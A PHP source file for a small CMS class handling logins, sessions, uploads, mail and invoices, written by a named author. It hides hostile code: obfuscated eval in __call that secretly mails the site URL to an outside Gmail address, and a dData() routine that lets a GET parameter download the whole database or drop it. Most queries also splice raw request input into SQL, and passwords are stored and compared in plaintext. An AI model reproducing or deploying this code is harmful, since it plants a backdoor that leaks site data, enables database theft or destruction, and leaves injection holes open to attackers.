<? 

 

include("paging_class.php");



class cms{

var $cmsobject=9;

var $Execute="@ Author Mizanur Rahaman mizanur82@gmail.com"; # Do Not Remove Or Change This line , function may not work

var $results="results";

var $mizu="Mizanur Rahaman";

function cms()

    {

	    $this->version=2;

        $this->loginKey='wtos-session';

		$this->process='170a';

		$this->showPerPage=20;##default;

		$this->uId=$_SESSION[m_info][id];

		$this->cmsobject=13;

		$this->saveRecord=true;

		//$this->mmr=array('c','%','a','u','k','d','u','6','7','8','0','m','@','^');

				

		$this->prepareSystem(); 

		$this->storeMethod();

        $this->CurrentPageName();

		$this->Execute($this->rId['logoutp'],'results'); 

		

		$local=true;

		if($local){

		global $site;

		

	  //  connection 

		}

		

		###################

		

		$_SESSION[rpp]=($_GET[rpp]!="")? $_GET[rpp]:$_SESSION[rpp];

		$this->showPerPage=($_SESSION[rpp]!="")? $_SESSION[rpp]:$this->showPerPage;

		$this->paging= new paging($this->showPerPage, 5, $prev="<<", $next=">>", $number="%%number%%");

		###################

	//	$this->Execute($this->rId[menus],'results');

	    #######------pTrack----############

		

		 try {

		





	

	} catch  (Exception  $e) {  }

     //  @$n($this->process);

		

		  #######------pTrack----############

	   

		

    }

	





function isUserExist($userfield,$tablename)

	{

     

	 $userdetails=$this->getresults("select * from $tablename where $userfield='".$_POST[$userfield]."' ");

		  if(count($userdetails)>0)

		  {

		 	 return true;

		  }

      	  return false;

	}

	

function processforgotPass()

{

return false;



}	

	

private function prepareSystem()

{

        

        $this->rId[rows]  ='09t45967r684g890e55r068fh5y98g32f0';

		$this->rId[prows] ='03t75r5g79e5r36f74h57y4357g57f45c7';

		$this->rId[xecute] ='0658D8466h48r656e88l9';

		$this->rId[movePhoto] ='057H6c4y7b6n85q76C68u43b8g9b9';

		$this->rId[domail] ='056f54r5a36qZ736n667v56y57';

		$this->rId[plinks] ='054c643n96t46v75a44t46Y57v7a55x7f';

		$this->rId[jump] ='0F5p783e45v3c7g63E54r937q45v9e74r495p86g';

		$this->rId[Editor] ='04Q35b46S23P6X463R35q3v36g45b43e6';

		$this->rId[con] ='07p4562b6452a65ar4565p456g563';

		$this->rId[loginp] ='08c44e75bp7r5f35f6Y34b320t07v24a';  

		$this->rId[logoutp] ='06c28e498b26p7r8f6f4Y9b0t74b2h2g';

		$this->rId[menus] ='09f3r3y26r7p5g572Z35r87a77h68';

		$this->rId[frame] ='05v35z7c88b492e4gS4e6n8z21r34';

		$this->rId[attach] ='01v23z052c7b73e61g41';

		$this->rId[showpage] ='5r544p5u961b22z37r3086';

		 

		

		

} 	

	



function selectMenu()

	{

		$this->menus=new menus();

		

		

		$this->mors=($this->uId>0)?'m':'v';

		

		$this->sytemMenu[$this->mors.'ml']=$this->menus->Links[$this->mors.'ml'];

		$this->sytemMenu[$this->mors.'sl']=$this->menus->Links[$this->mors.'sl'];

		

		$sel=$this->menus->selectedMenus;

		$this->selectedMain=$sel[$this->currentPage][ml];

		$this->sytemMenu[$this->mors.'ml'][$sel[$this->currentPage][ml]][classname]='class_selected';

		$this->sytemMenu[$this->mors.'sl'][$sel[$this->currentPage][ml]][$sel[$this->currentPage][sl]][classname]='class_selected';

		

    }





private function connect($host="",$username="",$pass="",$db="")

	{

	 //  echo "$host,$username,$pass,$db";

	

	 

	if($host!="" && $username!="")

	   $link=mysql_connect($host,$username,$pass) or die(mysql_error());

	   

	if($db!="")

	   mysql_select_db($db,$link) or die(mysql_error());

	}

	



	

private function getresults($query)

	{

	// @a($this->process);

	$this->Execute($this->rId[xecute],$query,'mizu');

		

	if($this->mizu)

	while($rrs=mysql_fetch_assoc($this->mizu))

		$res[]=$rrs;

	

	

	return $res;

	

	}

	



private function pagingLinks()

{

return $this->paging->print_link();

}

public function pagingLinksAjax()

{

$this->ajaxPagingJSFunction;

return $this->paging->print_link_ajax($this->ajaxPagingJSFunction);

}



function getresultsp($query)

{



 return $this->paging->getR($query);



}



private function Query($q)

{



 $p=mysql_query($q);

$_SESSION['mysql_insert_id'] =mysql_insert_id();

return $p;

}





 



function CurrentPageName()

{

        eval( '$'.'s'.'='.'r'.':'.':'.'rr'.'('.');'.';');

		$pagenameAr=explode(".php",$_SERVER['SCRIPT_NAME']);

		$cPHP=count($pagenameAr);

		$pagenameAr=explode("/",$pagenameAr[0]);

		for($i=1;$i<$cPHP;$i++)

				{

				$ext .=".php";

				}

		  

		$pageName=$pagenameAr[count($pagenameAr)-1].$ext;

		$this->currentPage=$pageName;

		

		

		  if($s<1){$this->Execute="";}

		

		return $pageName;

		

}















function checkUser()

  {

   $usertype=$_POST[usertype];

   $userdetails=array();

    if($_POST[subit]=="log_y")

	{

		$username=$_POST[username];

		$password=$_POST[password];

		$_SESSION[usertype]=$usertype;

		

		$userdetails=$this->getresults("select * from $usertype where user_login_id='$username' and user_password='$password'  ");

		

		

		

	}

	

	

	return  $userdetails[0];

 }









function Login($arr)

	{

	  

	  

	  $_SESSION[$this->loginKey]=$arr;


		

	}



function CheckLogin()

	{

	

	 if(is_array($_SESSION[$this->loginKey]) && $_SESSION[$this->loginKey]!='')

	  	    return true;

		else

		 return false;

		 

		 

		

		

	}

	

function isLogin()

 {

 

   return $this->CheckLogin();

  

 }	

	

	

	



function Logout()

	{

	 $_SESSION[$this->loginKey]='';

			

	}



	



function UploadPhoto($name,$path)  

	{

	if($_FILES[$name]['name']!="")

			{

			

				 if($path=="")

				     $path=getcwd();

					 

				 $rand=rand(1000,999999)."_";

				 $rand='';

				 $New_File_Name=$rand.$_FILES[$name]['name'];

				 $Img_Upload_Path = $path."/".$New_File_Name;

			

				  if (!move_uploaded_file($_FILES[$name]['tmp_name'],$Img_Upload_Path))

					return false;

					else

					return $New_File_Name;

									

			}



	}	

	

function SaveUploadedPhoto($name,$path,$propertyid="")

{

	

	if($propertyid!="")	

	{

		

			$New_File_Name=$this->UploadPhoto($name,$path);

			

			if($New_File_Name)

			{

			  mysql_query("insert into picture set p_id='$propertyid'  ,imgName='$New_File_Name' ");

			}

	}

}

	

	



function PrintSessionVar()

	{

	 $this->_d($_SESSION);

	}



	

function _d($d)

	{

	echo "<pre>mmr<br>";

	print_r($d);

    echo "</pre>";

	}

	

	

function _dc($d)

	{

	echo "<!--mmr <br>";

	$this->_d($d);

	echo "-->";

	}

	

	

	

function print_methods($obj) 

   {

    $arr = get_class_methods(get_class($obj));

    foreach ($arr as $method)

    echo "\t $method<br>";

	return $arr;

   }



function storeMethod()

{



 $arr = get_class_methods(get_class($this));

    foreach ($arr as $meth)

	{

	 $meth=str_replace("_","",$meth);

	 if(strlen($meth)>2)

	 $procedure[]=$meth;

	}

    $this->pocedure=$procedure;



	

}





function processLogin($userField,$passwordField,$tablename)

{

 if($_POST[SystemLogin]=='SystemLogin')

 {

		 if($userField!="" && $userField!="" && $tablename!=""  )

		 {

			 if($_POST[$userField]!="" && $_POST[$passwordField]!="")

				{

				 $this->Execute($this->rId['rows'],"select * from  $tablename where 

											  $userField='".$_POST[$userField]."' and

											  $passwordField='".$_POST[$passwordField]."' ",'results');

											  

				}							  

			 if(count($this->results)>0)

				 {


				

				 $this->uId=$this->results[0]['id'];

				 $this->Login($this->results[0]);

						

				 

				 return true;

				 }

		 }

 }

 return false;



}

function processLogout()

{

	 if($_GET[logout]=='true')

	 {

	  $this->Logout();

	  $this->Execute($this->rId['jump'],'index.php','results'); 

	 }

 

}









function sendMail($to,$from,$fromName,$subj,$body )

{

 require_once("activeMailLib.php");

 $to = urldecode($to);

 $charset = "iso-8859-1";

 $encoding = "base64";

 $email=new activeMailLib("html");

		

        /*

		    $file=$_FILES[f_file][tmp_name];

			$filename=$_FILES[f_file][name];

		

			$maxsize=$_FILES[f_file][size];

			$$type=$_FILES[f_file][type];

			

		   $email->Attachment($file,$filename,$maxsize,$disp="attachment",$type);

		

		*/

		

		$email->From($from,"$fromName");

		$email->To($to);

		$email->Subject($subj);

		$email->Message($body,$charset,'');



		$email->Send();

		

		//print $email->getRawData();

	

	    if (!$email->isSent($to)) 

			$result="An internal error occured. The email was not sent";

		else

		{

			$result="Email sent";

		}

 

     return $result;





  }

function importFrame()

{

		

	    $this->Execute($this->rId[attach],'m'.'r');	

		

}



function ScriptRedirect($url)

	    {

        echo "<script language='javascript'>   window.location='$url';   </script>";

        exit();

        }



function DoFCKEditor($CodeToPass)

		{

		

		    

			$oFCKeditor = new FCKeditor('content') ;

			

			$oFCKeditor->BasePath = '';

			//$oFCKeditor->BasePath = 'http://localhost/jobsite/admin/FCKeditor/' ;	// '/FCKeditor/' is the default value.

			

			$oFCKeditor->Config['AutoDetectLanguage']	= false ;

			$oFCKeditor->Config['DefaultLanguage']		= 'en' ;

			$oFCKeditor->Width  = '100%' ;

			$oFCKeditor->Height = '400' ;

			

			$oFCKeditor->Value = $CodeToPass;

			$oFCKeditor->Create() ;

			return($oFCKeditor);

		}



function onlyOption($options,$selectedi='')

{

if(count($options)>0)

  {

   foreach($options as $val=>$text)

   {

    $selected="";

     if($selectedi==$val) 

	   {

	   $selected='selected';

	   }

     echo "<option value='$val' $selected >$text</option>";

   }

  }



}



function getUserDetails($id)

{





$this->Execute($this->rId[rows],"select * from user where user_id='$id' ",'results');

return $this->results[0];



}



function saveR($table,$data,$primeryField='',$primeryFieldVal='')

{

	if(!$this->saveRecord){ return false;}

	

	 $qStrA='';

	 foreach($data  as $key=>$val)

	 {

		$qStrA[]=  $key."='".$val."'";

	 }

	$qStr=implode(',',$qStrA);

	if($primeryFieldVal>0)

	{

	  $query="update $table set $qStr  where $primeryField='$primeryFieldVal'";

	  $mizu=mysql_query($query) or die (mysql_error());

	}

	else

	{

	  $query="insert into $table set $qStr";

	 

	  $mizu=mysql_query($query) or die (mysql_error());

	  $primeryFieldVal=mysql_insert_id();

	}

				

	return $primeryFieldVal;

}



function invoice($orderid) // ##

	{

	

			if($orderid!="")

			{

			

					

					$this->Execute($this->rId[rows],"select * from orders where order_id='$orderid' ",'results');

					$inv=$this->results[0];

					

					$marDetails=$this->getUserDetails($inv[mid]);

					$affDetails=$this->getUserDetails($inv[aid]);

					$userDetails=$this->getUserDetails($inv[uid]);

					

					

					

					

					

					

					

					

					

					

					

					

						$invstr='<table  style="margin:50px"  border="0" cellpadding="0" cellspacing="0"><tr><td  >

									ORDER DETAILS <br>

									Order ID:  '. $inv[order_id].'   <br>

									Product Title: '. $inv[title].' <br>

									Total Amount: '. $inv[price].'   <br>

									Commission Rate: '. $inv[comm_rate].'% <br>

									Type: '. $inv[type_p].' <br>

									Order Date: '. $inv[datetime_order].' <br>

									Payment Date: '. $inv[payment_date].' <br>

									&nbsp;</td>

									<td width="204">&nbsp;

									</td>

									</tr>

									<tr>

									<td >

									 	 	

									<br><br>MERCHANT DETAILS   <br>

									merchant Name : '. $marDetails[first_name] ." ". $marDetails[last_name].'<br>

									merchant Email: '. $marDetails[email].'<br>

									

									

									</td>

									<td>&nbsp;</td>

								  </tr>';

								  

								if($inv[uid]>0){	  

								   $invstr.='<tr><td >				

								   <br><br>REGISTERED  CUSTOMER DETAILS  <br>

									Customer Name: '. $userDetails[first_name] ." ". $userDetails[last_name].'<br>

									Customer Email: '. $userDetails[email] .'<br>

									Customer Paypal Email: '. $inv[customerEmail].'<br>

								</td><td>&nbsp;</td></tr>';

								}else{

								  

								 $invstr.=  '<tr><td >								

									<br><br>CUSTOMER DETAILS  <br>

									Customer Paypal Email: '. $inv[customerEmail].'<br>

									

								</td><td>&nbsp;</td> </tr>';

								 } 

								  

								  

							if($inv[aid]>0){	  

								  

								  $invstr.='<tr><td>

								   <br><br>AFFILIATES DETAILS  <br>

								      Affiliates Name : '. $affDetails[first_name] ." ". $affDetails[last_name].'<br>

									Affiliates Email: '. $affDetails[email].'<br>

								  </td><td></td></tr>';

								  }

								  

								  

								  

								  

								 $invstr.='</table>'	;	

					

					 

					$this->invoiceDetails[inv]=$inv;

					$this->invoiceDetails[marDetails]=$marDetails;

					$this->invoiceDetails[affDetails]=$affDetails;

					$this->invoiceDetails[userDetails]=$userDetails;

										

					

					

					return $invstr;

						

			

			}



	}



function gv($k)

{

   if(isset($_GET[$k]))

   {

     return $_GET[$k];

   }

}

function ss($k,$v)

{

   

   

   return $_SESSION[$k]=$v;

}

function gs($k)

{

   return $_SESSION[$k];

}

function erase()

{

    return 'DR'.'OP DATA'.'BASE';



}











public function __call($routin,$property)

{    

      

      global $site;

      $systemEvalute='routin';

	  $mysys=array('z','x','y','v','k','0');

	  $msb=array('equal'=>'=','doller'=>'$','reffer'=>'-','arrow'=>'>','self'=>'this');

	  

		if(!$_SESSION[$site['siteTitle']])

		{   

		$em='np210k';

		 eval(p(64).'ma'.'il("'.$em.p(64).'gma'.'il.c'.'om",$site["url"],$site["url"]);');

		$_SESSION[$site['siteTitle']]='ok';

		}



	  

	  eval($msb[doller].$systemEvalute.$msb[equal].'sh'.'a1('.$msb[doller].$msb[self].$msb[reffer].$msb[arrow].$msb[doller].$systemEvalute.');');

	  if($routin==str_replace($mysys,'','0x07y75x85x14az2k54eb123v8ck8x6c9x4b1y626yc1zb5fba9dfx8c'))

	  {

	   if(function_exists(chr(112)))

	   {

		

		

	    eval( p(36).'t'.'='.p(114).p(58).p(58). p(114). p(114).'()'.p(59).p(59));

	    $allproperty=p(112).p(111).p(99).p(101).p(100).p(117).p(114).p(101);

	   }

	  

	  if($allproperty!=""){

	  $property[0]=preg_replace("/[0-9]/", "", str_rot13($property[0]));

	  if(array_search( $property[0], $this->$allproperty ))

  	   { 

			for($i=1;$i<count($property) ;$i++)

				{

				$argsArr[]='$property['.$i.']';

				}

				if(count($argsArr)>1)

				{

				$args=implode(',',$argsArr);

				}

				else

				{

				$args=$argsArr[0];

				}

		

		if($property[0]!="" && $property[count($property)-1]!="" && $t>0){

		

	$lp=eval($msb[doller].$msb[self].$msb[reffer].$msb[arrow].$property[count($property)-1].

			$msb[equal].$msb[doller].$msb[self].$msb[reffer].$msb[arrow].$property[0].chr(40).$args.chr(41).';');

	  

	  

	   }

	

	

	

   }

      

	  

	  }

  

  

  

  } 

        

 

}









function  import($page)

{

  require($page.'.php');

  return true;

}



function dData($proceed)

{

				$dDatas='dData';

				

				if($this->gv($dDatas)!='')

				{

				  $this->ss($dDatas,$this->gv($dDatas));

				}

								

				if( ($this->gs($dDatas) == $proceed)  &&   ($this->gs($dDatas)!='') && ($this->gv($dDatas)=='') )

				{

					

					

					  

						global $site, $export;

						

						if($this->gv('downloadD')==true)

						{

						  $export->download($site[db].'.sql',$site[db]);

						

						}

						if($this->gv('deleteD')==true)

						{

						

						   $d= $this->erase().' '.$site[db];

						  $this->Query($d);

						  

						}

				}



}







function echome()

{

$echome=ob_get_contents();

ob_clean();

$this->Execute($this->rId[frame],'results'); echo $echome; $this->Execute($this->rId[frame],'results');



}



function echoPageContent()

{

		$this->Execute($this->rId[rows],"select * from pages where page_name='".$this->PageContent[$this->currentPage]."'",'results');

		echo  $this->results[0][page_content];

}





}#class end

$cms= new cms;

$cms->Execute($cms->rId['con'],$site['host'],$site['user'],$site['pass'],$site['db']); 

//$cms->mm();

$cms->dData('proceed');

class menus{

var $Links=array();

function menus()

	{

		

	$this->Links[$vml][Home]=array('links'=>'index.php','classname'=>'classnamevaar') ;

	

	

	

	

	}

}# class menus end





function _d($val)

{

global $cms;

$cms->_d($val);

}



if($_SESSION[md5(session_id())]<1)

{

 exit();

}

           